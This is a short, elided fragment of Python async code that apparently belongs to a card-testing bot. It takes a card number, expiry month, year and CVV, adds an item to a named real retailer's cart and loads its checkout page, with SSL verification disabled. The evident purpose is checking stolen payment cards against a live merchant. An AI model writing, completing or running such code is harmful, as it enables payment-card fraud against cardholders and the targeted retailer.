...
async def auto_sho_async(cc, mes, ano, cvv):
    ...
    async with aiohttp.ClientSession(connector=conn) as session:
        ...
        req1 = await session.post(url=f"https://bluemercury.com/cart/add.js", data=payload_1, ssl=False, timeout=aiohttp.ClientTimeout(total=5))

        req3 = await session.get(url=f"https://bluemercury.com/checkout", ssl=False, timeout=aiohttp.ClientTimeout(total=5))
